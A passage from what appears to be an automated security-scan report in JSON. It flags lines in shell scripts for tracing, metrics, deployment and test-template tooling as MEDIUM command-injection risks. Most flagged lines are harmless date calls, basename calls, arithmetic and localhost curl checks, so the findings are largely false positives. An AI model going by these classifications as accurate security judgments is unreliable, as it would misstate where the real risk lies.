        "evidence": "print_info \"Original:  $(human_size \"$original_size\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 407,
        "issue": "Command substitution in shell",
        "evidence": "print_info \"Optimized: $(human_size \"$optimized_size\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url <service-url> [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000/api/users",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 53,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 --format b3",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 56,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 \\\\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 60,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 121,
        "issue": "Command substitution in shell",
        "evidence": "printf '%032x' $((RANDOM * RANDOM * RANDOM * RANDOM))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 126,
        "issue": "Command substitution in shell",
        "evidence": "printf '%016x' $((RANDOM * RANDOM))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "local timestamp=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "local random=$(printf '%024x' $((RANDOM * RANDOM * RANDOM)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "local trace_id=$(generate_trace_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 174,
        "issue": "Command substitution in shell",
        "evidence": "local span_id=$(generate_span_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 181,
        "issue": "Command substitution in shell",
        "evidence": "local traceparent=$(generate_w3c_traceparent \"$trace_id\" \"$span_id\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "local xray_trace_id=\"1-$(date +%s)-${trace_id:0:24}\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 211,
        "issue": "Command substitution in shell",
        "evidence": "response=$(eval \"$curl_cmd '$url'\" 2>&1) || {",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "response_headers=$(cat \"/tmp/test_propagation_headers_$$.txt\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 236,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"traceparent:\" | sed 's/.*00-\\([^-]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-B3-TraceId:\" | awk '{print $2}' | tr -d '\\r')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"b3:\" | sed 's/.*b3: \\([^-]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"uber-trace-id:\" | sed 's/.*uber-trace-id: \\([^:]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-Amzn-Trace-Id:\" | sed 's/.*Root=\\([^;]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 281,
        "issue": "Command substitution in shell",
        "evidence": "local trace_id=$(generate_trace_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "local span_id=$(generate_span_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "result1=$(test_propagation \"$url1\" \"$format\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "local propagated1=$(echo \"$result1\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "result2=$(test_propagation \"$url2\" \"$format\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 299,
        "issue": "Command substitution in shell",
        "evidence": "local propagated2=$(echo \"$result2\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 300,
        "issue": "Command substitution in shell",
        "evidence": "local trace_preserved2=$(echo \"$result2\" | cut -d'|' -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 301,
        "issue": "Command substitution in shell",
        "evidence": "local received_trace_id2=$(echo \"$result2\" | cut -d'|' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 311,
        "issue": "Command substitution in shell",
        "evidence": "local propagated=$(echo \"$result\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "local trace_preserved=$(echo \"$result\" | cut -d'|' -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 313,
        "issue": "Command substitution in shell",
        "evidence": "local sent_trace_id=$(echo \"$result\" | cut -d'|' -f3)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "local received_trace_id=$(echo \"$result\" | cut -d'|' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 325,
        "issue": "Command substitution in shell",
        "evidence": "\"passed\": $([ \"$propagated\" == \"true\" ] && [ \"$trace_preserved\" == \"true\" ] && echo \"true\" || echo \"false\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 364,
        "issue": "Command substitution in shell",
        "evidence": "result=$(test_propagation \"$URL\" \"$FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 368,
        "issue": "Command substitution in shell",
        "evidence": "result=$(test_multihop \"$URL\" \"$DOWNSTREAM_URL\" \"$FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 149,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 155,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 182,
        "issue": "Command substitution in shell",
        "evidence": "local total_lines=$(wc -l < \"$metrics_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_METRICS=$(echo \"$metric_names\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 302,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_HELP=$(grep -c '^# HELP ' \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 303,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TYPE=$(grep -c '^# TYPE ' \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "local metrics_count=$(echo \"$metric_names\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "local missing=$((metrics_count - TOTAL_HELP))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 323,
        "issue": "Command substitution in shell",
        "evidence": "local missing=$((metrics_count - TOTAL_TYPE))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_SAMPLES=$(grep -v '^#' \"$metrics_file\" | grep -v '^$' | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "local avg_cardinality=$((TOTAL_SAMPLES / TOTAL_METRICS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 378,
        "issue": "Command substitution in shell",
        "evidence": "local types=$(grep '^# TYPE ' \"$metrics_file\" | awk '{print $4}' | sort | uniq -c)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 405,
        "issue": "Command substitution in shell",
        "evidence": "local issues_json=$(printf '%s\\n' \"${ISSUES[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "local warnings_json=$(printf '%s\\n' \"${WARNINGS[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 27,
        "issue": "Command substitution in shell",
        "evidence": "HELP_TEXT=\"Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 41,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 44,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --file exporters.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 47,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --verbose",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 172,
        "issue": "Command substitution in shell",
        "evidence": "content_type=$(curl -s -I -m \"$TIMEOUT\" \"$url\" 2>/dev/null | grep -i \"content-type\" | cut -d: -f2 | tr -d '[:space:]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "metrics_with_help=$(grep -c \"^# HELP \" \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "metrics_with_type=$(grep -c \"^# TYPE \" \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "local help_percentage=$((metrics_with_help * 100 / (total_metrics + 1)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "local type_percentage=$((metrics_with_type * 100 / (total_metrics + 1)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 324,
        "issue": "Command substitution in shell",
        "evidence": "error_percentage=$((bad_names * 100 / total_metrics))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "metric_count=$(grep -v \"^#\" \"$metrics_file\" | grep -c \"^[a-zA-Z]\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "metrics_file=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 489,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    \\\"passed\\\": $((${#urls[@]} - failed)),\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") LANGUAGE NAME [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 68,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") python Calculator --framework pytest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 71,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") typescript UserService --framework jest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 74,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") python OrderProcessor --style bdd",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 77,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") rust string_utils",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 80,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") go Validator",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "it(\\`should return \\${expected}\\`, () => {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 713,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_python_pytest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 719,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 725,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 728,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_rust_tests \"$NAME\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 731,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_go_tests \"$NAME\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 742,
        "issue": "Command substitution in shell",
        "evidence": "output_file=\"$OUTPUT_DIR/$(basename \"$content\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 751,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_python_pytest \"$NAME\" \"$STYLE\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 754,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_typescript_jest \"$NAME\" \"$STYLE\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 757,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_rust_tests \"$NAME\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 760,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_go_tests \"$NAME\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 156,
        "issue": "Command substitution in shell",
        "evidence": "start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 159,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -w \"\\n%{http_code}\" --max-time \"$TIMEOUT\" \"$url\" 2>/dev/null || echo -e \"\\n000\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 161,
        "issue": "Command substitution in shell",
        "evidence": "end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "duration=$(( (end_time - start_time) / 1000000 )) # Convert to milliseconds",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(echo \"$response\" | tail -n 1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 167,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_LATENCY=$((TOTAL_LATENCY + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "TIMEOUTS=$((TIMEOUTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 184,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 186,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|timeout|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 190,
        "issue": "Command substitution in shell",
        "evidence": "SUCCESSFUL_REQUESTS=$((SUCCESSFUL_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
